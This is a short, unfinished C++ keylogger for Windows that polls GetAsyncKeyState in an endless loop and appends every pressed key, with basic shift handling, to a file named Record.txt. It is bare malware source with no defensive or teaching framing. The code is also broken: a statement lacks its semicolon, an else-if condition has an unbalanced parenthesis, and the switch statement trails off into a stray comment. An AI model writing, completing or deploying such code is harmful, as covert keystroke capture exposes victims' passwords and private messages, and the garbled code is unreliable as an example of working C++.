#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log(){
  char key;

  for(;;){
    //sleep(0); //don't interapt other programs runnig simultaniously
    for(key=8; key<=222; key++){
      if(GetAsyncKeyState(key) == -32767){
        ofstream write ("Record.txt", ios::app)
        if((key>64)&&(key<91)&&!(GetAsyncKeyState(0x10))){
          key += 32;
          write << key;
          write.close();
          break;
        }else if((key>64)&& key<91)){
          write << key;
          write.close();
          break;
        }else{
          switch(key){
            case 49:{
              if(GetAsyncKeyState(0x10)){
                write << "!";
              }else{
                write << key;
              }
            }
            //case
          }
        }
      }
    }
  }
}

int main(){
	log();

	return 0;
}
